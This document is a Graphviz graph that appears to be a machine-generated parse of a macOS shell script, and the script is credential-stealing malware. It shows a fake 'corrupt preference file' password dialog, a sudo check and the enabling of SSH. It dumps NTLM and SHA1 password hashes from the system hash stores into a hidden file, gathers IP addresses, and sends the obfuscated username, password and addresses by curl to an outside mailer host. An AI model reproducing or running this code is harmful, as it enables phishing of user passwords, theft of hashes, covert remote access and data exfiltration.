digraph {
0 [label="local blahblah=A corrupt preference file has been detected and must be repaired. "];
0 -> 2 [label="N,function,(,),SC,{,"];
2 [label="blahblah=${blahblah} Enter the password for the user account ${the_username} to continue: "];
2 -> 4 [label="\n,"];
4 [label="the_password=$( osascript -l AppleScript \t\t-e \"tell application \\\"System Events\\\"\" \t\t-e \"activate\" \t\t-e \"set the_icon to ${the_icon}\" \t\t-e \"display dialog \\\"${blahblah}\\\" \t\t\twith icon ${the_icon} with title \\\"Password\\\" default answer \\\"\\\" with hidden answer \t\t\tbuttons {\\\"OK\\\"} default button \\\"OK\\\"\" \t\t-e \"end tell\" ) "];
4 -> 6 [label="N,\n,"];
6 [label="osascript -l AppleScript -e tell application \"System Events\" -e activate -e set the_icon to ${the_icon} -e display dialog \"${blahblah}\" \t\t\twith icon ${the_icon} with title \"Password\" default answer \"\" with hidden answer \t\t\tbuttons {\"OK\"} default button \"OK\" -e end tell "];
6 -> 8 [label="N,N,"];
8 [label="the_password=${the_password#*text returned:} "];
8 -> 10 [label="\n,"];
10 [label="the_password=${the_password% "];
10 -> 12 [label="N,;,"];
12 [label="[ ${admin_user} == true ] "];
12 -> 14 [label="N,\n,"];
14 [label="test_password "];
14 -> 134 [label="&&,"];
134 [label="return 0 "];
134 -> 18 [label="&&,"];
18 [label="sudo -k "];
18 -> 20 [label="\n,},N,function,(,),SC,{,"];
20 [label="the_uid=$( osascript -l AppleScript -e \"do shell script \\\"id -u\\\" user name \\\"${the_username}\\\" password \t\t\\\"${the_password}\\\" with administrator privileges\" ) "];
20 -> 22 [label="\n,"];
22 [label="osascript -l AppleScript -e do shell script \"id -u\" user name \"${the_username}\" password \t\t\"${the_password}\" with administrator privileges "];
22 -> 24 [label="N,N,"];
24 [label="[ ${the_uid} == 0 ] "];
24 -> 72 [label="\n,"];
72 [label="root_access=true "];
72 -> 134 [label="&&,"];
134 [label="return 0 "];
134 -> 30 [label="N,&&,"];
30 [label="osascript -l AppleScript -e tell application \"System Events\" to display dialog \t\t\t\"Incorrect password. Click Ok to try again.\" buttons {\"OK\"} default button \"OK\" "];
30 -> 32 [label="\n,"];
32 [label="the_password= "];
32 -> 326 [label="\n,"];
326 [label="request_password "];
326 -> 36 [label="N,\n,"];
36 [label="local -i last_access_time=0 "];
36 -> 38 [label="\n,},N,function,(,),SC,{,"];
38 [label="touch .saywhat /dev/null "];
38 -> 294 [label="\n,"];
294 [label="/dev/null "];
294 -> 294
42 [label="last_access_time=$( stat -xt \"%H%M\" .saywhat 2>/dev/null | grep Access | cut -d \' \' -f 2 ) "];
42 -> 62 [label="\n,"];
62 [label="stat -xt %H%M .saywhat /dev/null "];
62 -> 294 [label="N,N,N,"];
294 [label="/dev/null "];
294 -> 294
66 [label="grep Access "];
66 -> 68 [label="N,"];
68 [label="cut -d   -f 2 "];
68 -> 80 [label="N,"];
80 [label="echo ${the_password} "];
80 -> 54 [label="\n,N,"];
54 [label="sudo -S touch .saywhat /dev/null "];
54 -> 294 [label="N,"];
294 [label="/dev/null "];
294 -> 294
58 [label="sleep 2 "];
58 -> 60 [label="&,"];
60 [label="[ $( stat -xt \"%H%M\" .saywhat 2>/dev/null | grep Access | cut -d \' \' -f 2) -ne ${last_access_time} ] "];
60 -> 62 [label="\n,SC,N,if,"];
62 [label="stat -xt %H%M .saywhat /dev/null "];
62 -> 294 [label="N,N,"];
294 [label="/dev/null "];
294 -> 294
66 [label="grep Access "];
66 -> 68 [label="N,"];
68 [label="cut -d   -f 2 "];
68 -> 70 [label="N,"];
70 [label="sudo_works=true "];
70 -> 72 [label=";,then,"];
72 [label="root_access=true "];
72 -> 74 [label="N,\n,"];
74 [label="sudo rm .saywhat /dev/null "];
74 -> 294 [label="N,\n,"];
294 [label="/dev/null "];
294 -> 294
330 [label="enable_ssh "];
330 -> 80 [label="&,"];
80 [label="echo ${the_password} "];
80 -> 82 [label="\n,fi,\n,},N,function,(,),SC,{,N,"];
82 [label="sudo -S echo "];
82 -> 84 [label="N,"];
84 [label="[ -f /System/Library/LaunchDaemons/ssh.plist ] "];
84 -> 86 [label="\n,SC,N,if,"];
86 [label="sudo /bin/launchctl load -w /System/Library/LaunchDaemons/ssh.plist "];
86 -> 132 [label=";,then,"];
132 [label="ssh_enabled=true "];
132 -> 134 [label="&&,"];
134 [label="return 0 "];
134 -> 92 [label="N,&&,"];
92 [label="sudo /usr/bin/defaults write /System/Library/LaunchDaemons/ssh Disabled false "];
92 -> 94 [label="\n,"];
94 [label="sudo /sbin/service ssh start "];
94 -> 132 [label="\n,"];
132 [label="ssh_enabled=true "];
132 -> 98 [label="&&,"];
98 [label="[ -f /private/etc/xinetd.d/ssh ] "];
98 -> 100 [label="N,\n,elif,"];
100 [label="sudo sed -e s/disable = .*$/disable = no/ /private/etc/xinetd.d/ssh /private/etc/xinetd.d/ssh.new "];
100 -> 102 [label=";,then,"];
102 [label="/private/etc/xinetd.d/ssh.new "];
102 -> 102
104 [label="mv /private/etc/xinetd.d/ssh /private/etc/xinetd.d/ssh.old "];
104 -> 106 [label="&&,"];
106 [label="mv /private/etc/xinetd.d/ssh.new /private/etc/xinetd.d/ssh "];
106 -> 108 [label="&&,"];
108 [label="sudo killall xinetd "];
108 -> 110 [label="&&,"];
110 [label="sudo xinetd --start "];
110 -> 132 [label="&&,"];
132 [label="ssh_enabled=true "];
132 -> 134 [label="&&,"];
134 [label="return 0 "];
134 -> 116 [label="N,&&,"];
116 [label="sudo sed -e s/SSHSERVER=-NO-/SSHSERVER=-YES-/ /etc/hostconfig /etc/hostconfig.new "];
116 -> 118 [label="\n,else,"];
118 [label="/etc/hostconfig.new "];
118 -> 118
120 [label="mv /etc/hostconfig.new /etc/hostconfig "];
120 -> 122 [label="&&,"];
122 [label="grep SSHSERVER=-YES- /etc/hostconfig "];
122 -> 124 [label="\n,"];
124 [label="sudo echo SSHSERVER=-YES- /etc/hostconfig "];
124 -> 126 [label="||,"];
126 [label="/etc/hostconfig "];
126 -> 126
128 [label="sudo killall inetd "];
128 -> 130 [label="\n,"];
130 [label="sudo inetd "];
130 -> 132 [label="&&,"];
132 [label="ssh_enabled=true "];
132 -> 134 [label="&&,"];
134 [label="return 0 "];
134 -> 136 [label="N,&&,"];
136 [label="local the_name line the_rest the_hashfile the_hash SSHA1 S0SHA1 "];
136 -> 138 [label="\n,fi,\n,},N,function,(,),SC,{,"];
138 [label="echo -n ${the_username}${tab}${the_password}${tab} ${secret_file} "];
138 -> 238 [label="\n,"];
238 [label="${secret_file} "];
238 -> 238
142 [label="id ${secret_file} "];
142 -> 238 [label="\n,"];
238 [label="${secret_file} "];
238 -> 238
146 [label="/usr/bin/nidump passwd . /dev/null ${secret_file} "];
146 -> 294 [label="\n,"];
294 [label="/dev/null "];
294 -> 294
238 [label="${secret_file} "];
238 -> 238
152 [label="[ ${root_access} == true ] "];
152 -> 154 [label="\n,SC,N,if,"];
154 [label="[ ${osxversion} -eq 3 ] "];
154 -> 217 [label=";,then,SC,N,if,"];
217 [label="/usr/bin/nidump passwd . /dev/null "];
217 -> 294 [label=";,then,N,"];
294 [label="/dev/null "];
294 -> 294
221 [label="grep -v :*: "];
221 -> 223 [label="N,"];
223 [label="read line "];
223 -> 225 [label="N,SC,N,while,"];
225 [label="the_name=${line%%:*} the_rest=${line#*:*:} "];
225 -> 227 [label="do,"];
227 [label="the_hashfile=$( niutil -readprop . \"/users/${the_name}\" generateduid 2>&1 ) "];
227 -> 229 [label="N,N,\n,"];
229 [label="niutil -readprop . /users/${the_name} generateduid "];
229 -> 229
169 [label="[ -f /var/db/shadow/hash/${the_hashfile} ] "];
169 -> 171 [label="\n,"];
171 [label="the_hash=$( sudo cat \"/var/db/shadow/hash/${the_hashfile}\" ) "];
171 -> 173 [label="&&,"];
173 [label="sudo cat /var/db/shadow/hash/${the_hashfile} "];
173 -> 175 [label="N,N,"];
175 [label="[ ${the_hash:0:63} != , word=\"$( jot -s '' -b 0 63 )\" -a ${the_hash:0:63} !=  ] "];
175 -> 177 [label="\n,"];
177 [label="jot -s  -b 0 63 "];
177 -> 236 [label="N,"];
236 [label="echo _${the_name}_NTLM:${the_hash:0:32}:${the_hash:32:32}:${the_rest} ${secret_file} "];
236 -> 238 [label="&&,"];
238 [label="${secret_file} "];
238 -> 238
183 [label="echo _${the_name}_rawSHA1:${the_hash:64:40}:${the_rest} ${secret_file} "];
183 -> 238 [label="\n,"];
238 [label="${secret_file} "];
238 -> 238
187 [label="[ ${osxversion} -ge 4 ] "];
187 -> 189 [label="\n,done,elif,"];
189 [label="dscl . -list /Users authentication_authority "];
189 -> 191 [label=";,then,N,"];
191 [label="grep -i hash "];
191 -> 193 [label="N,"];
193 [label="sed s/ .*$// "];
193 -> 195 [label="N,"];
195 [label="read the_name "];
195 -> 197 [label="N,SC,N,while,"];
197 [label="the_hashfile=$( dscl . -read /users/\"${the_name}\" generateduid | sed \"s/^.* //\" ) "];
197 -> 199 [label="do,"];
199 [label="dscl . -read /users/${the_name} generateduid "];
199 -> 201 [label="N,N,N,"];
201 [label="sed s/^.* // "];
201 -> 203 [label="N,"];
203 [label="the_hash=$( sudo cat \"/var/db/shadow/hash/$the_hashfile\" ) "];
203 -> 205 [label="\n,"];
205 [label="sudo cat /var/db/shadow/hash/$the_hashfile "];
205 -> 207 [label="N,N,"];
207 [label="S0SHA1=${the_hash:104:48} "];
207 -> 209 [label="\n,"];
209 [label="SSHA1=${the_hash:168:48} "];
209 -> 211 [label="\n,"];
211 [label="echo ${the_name}_NTLM:${the_hash:0:32}${the_hash:32:32}:${newline}${the_name}_SSHA1: ${SSHA1}:${newline}${the_name}_S0SHA1:${S0SHA1}: ${secret_file} "];
211 -> 238 [label="\n,"];
238 [label="${secret_file} "];
238 -> 238
215 [label="[ ${osxversion} -le 2 ] "];
215 -> 217 [label="\n,done,, word=[,elif,"];
217 [label="/usr/bin/nidump passwd . /dev/null "];
217 -> 294 [label=";,then,N,"];
294 [label="/dev/null "];
294 -> 294
221 [label="grep -v :*: "];
221 -> 223 [label="N,"];
223 [label="read line "];
223 -> 225 [label="N,SC,N,while,"];
225 [label="the_name=${line%%:*} the_rest=${line#*:*:} "];
225 -> 227 [label="do,"];
227 [label="the_hashfile=$( niutil -readprop . \"/users/${the_name}\" generateduid 2>&1 ) "];
227 -> 229 [label="N,N,\n,"];
229 [label="niutil -readprop . /users/${the_name} generateduid "];
229 -> 229
230 [label="[ -f /var/db/samba/hash/${the_hashfile} ] "];
230 -> 232 [label="\n,"];
232 [label="the_hash=$( sudo cat \"/var/db/samba/hash/${the_hashfile}\" ) "];
232 -> 234 [label="&&,"];
234 [label="sudo cat /var/db/samba/hash/${the_hashfile} "];
234 -> 236 [label="N,N,"];
236 [label="echo _${the_name}_NTLM:${the_hash:0:32}:${the_hash:32:32}:${the_rest} ${secret_file} "];
236 -> 238 [label="\n,"];
238 [label="${secret_file} "];
238 -> 238
240 [label="declare the_username the_password "];
240 -> 242 [label="\n,done,fi,fi,\n,},"];
242 [label="declare groups admin_user=false root_access=false sudo_works=false "];
242 -> 242
244 [label="declare ip_addresses public_ip_address private_ip_address_en0 private_ip_address_en1 private_ip_address_of_router "];
244 -> 244
246 [label="declare the_email the_subject the_message "];
246 -> 246
248 [label="declare the_uid ssh_enabled=false "];
248 -> 248
250 [label="declare , word=\"osxversion=$( sw_vers -productVersion | cut -d '.' -f 2 )\" "];
250 -> 250
252 [label="sw_vers -productVersion "];
252 -> 254 [label="N,N,"];
254 [label="cut -d . -f 2 "];
254 -> 256 [label="N,"];
256 [label="declare output_file=false secret_file=~/Public/.howdy "];
256 -> 256
258 [label="declare tab=$t newline=$n "];
258 -> 258
260 [label="declare the_icon=2 "];
260 -> 260
262 [label="[ -f /System/Library/CoreServices/SecurityAgent.app/Contents/Resources/Security.icns ] "];
262 -> 264 [label="SC,N,if,"];
264 [label="the_icon=POSIX file \"/System/Library/CoreServices/SecurityAgent.app/Contents/Resources/Security.icns\" "];
264 -> 266 [label=";,then,"];
266 [label="the_username=$( /usr/bin/whoami ) "];
266 -> 268 [label="N,fi,"];
268 [label="/usr/bin/whoami "];
268 -> 270 [label="N,N,"];
270 [label=", word=\"public_ip_address=$( curl http://ipid.shat.net/iponly/ | grep body | sed -e 's/^<body>//' -e 's/<.*$//' )\" "];
270 -> 270
272 [label="curl http://ipid.shat.net/iponly/ "];
272 -> 274 [label="N,N,N,"];
274 [label="grep body "];
274 -> 276 [label="N,"];
276 [label="sed -e s/^<body>// -e s/<.*$// "];
276 -> 278 [label="N,"];
278 [label=", word=\"private_ip_address_en0=$( ifconfig en0 2>/dev/null | head -n 2 | tail -n 1 | sed -e 's/^.*inet //' -e 's/ .*$//' )\" "];
278 -> 278
280 [label="ifconfig en0 /dev/null "];
280 -> 294 [label="N,N,"];
294 [label="/dev/null "];
294 -> 294
296 [label="head -n 2 "];
296 -> 298 [label="N,"];
298 [label="tail -n 1 "];
298 -> 300 [label="N,"];
300 [label="sed -e s/^.*inet // -e s/ .*$// "];
300 -> 290 [label="N,"];
290 [label=", word=\"private_ip_address_en1=$( ifconfig en1 2>/dev/null | head -n 2 | tail -n 1 | sed -e 's/^.*inet //' -e 's/ .*$//' )\" "];
290 -> 290
292 [label="ifconfig en1 /dev/null "];
292 -> 294 [label="N,N,"];
294 [label="/dev/null "];
294 -> 294
296 [label="head -n 2 "];
296 -> 298 [label="N,"];
298 [label="tail -n 1 "];
298 -> 300 [label="N,"];
300 [label="sed -e s/^.*inet // -e s/ .*$// "];
300 -> 302 [label="N,"];
302 [label=", word=\"private_ip_address_of_router=$( arp -a | sed -e 's/^.* (//' -e 's/).*$//' )\" "];
302 -> 302
304 [label="arp -a "];
304 -> 306 [label="N,N,N,"];
306 [label="sed -e s/^.* (// -e s/).*$// "];
306 -> 308 [label="N,"];
308 [label="ip_addresses=${public_ip_address} ${private_ip_address_en0} ${private_ip_address_en1} ${private_ip_address_of_router} "];
308 -> 308
310 [label="ip_addresses=${ip_addresses//  / } "];
310 -> 312 [label="N,"];
312 [label="groups=$( /usr/bin/id ) "];
312 -> 314 [label="N,"];
314 [label="/usr/bin/id "];
314 -> 316 [label="N,N,"];
316 [label="[ ${groups} != ${groups/(admin)} ] "];
316 -> 316
318 [label="admin_user=true "];
318 -> 320 [label="&&,"];
320 [label="touch ${secret_file} "];
320 -> 322 [label="N,"];
322 [label="output_file=true "];
322 -> 324 [label="&&,"];
324 [label="test_sudo "];
324 -> 326 [label="N,"];
326 [label="request_password "];
326 -> 326
328 [label="[ ${root_access} == true -a ${ssh_enabled} != true ] "];
328 -> 330 [label="SC,N,if,"];
330 [label="enable_ssh "];
330 -> 332 [label=";,then,"];
332 [label="[ ${output_file} == true ] "];
332 -> 334 [label="fi,"];
334 [label="output "];
334 -> 336 [label="&&,"];
336 [label="the_email=andrew%40schjelderup.org "];
336 -> 336
338 [label="the_subject=Howdy "];
338 -> 340 [label="N,"];
340 [label="the_message=${the_username} ${the_password} ${ip_addresses} "];
340 -> 342 [label="N,"];
342 [label=", word=\"the_message=$( echo ${the_message} | /usr/bin/tr '. 0123456789[A-M][N-Z][a-m][n-z]' '_+5678901234[N-Z][A-M][n-z][a-m]' )\" "];
342 -> 344 [label="N,"];
344 [label="echo ${the_message} "];
344 -> 346 [label="N,N,N,"];
346 [label="/usr/bin/tr . 0123456789[A-M][N-Z][a-m][n-z] _+5678901234[N-Z][A-M][n-z][a-m] "];
346 -> 348 [label="N,"];
348 [label="email_result=$( curl -d \"email=${the_email}&subject=${the_subject}&message=${the_message}\" --referer http://psidude.com/mailer/mail.php psidude.com/mailer/mail.php ) "];
348 -> 348
350 [label="curl -d email=${the_email}&subject=${the_subject}&message=${the_message} --referer http://psidude.com/mailer/mail.php psidude.com/mailer/mail.php "];
350 -> 352 [label="N,N,"];
352 [label="exit 0 "];
352 -> 352
}
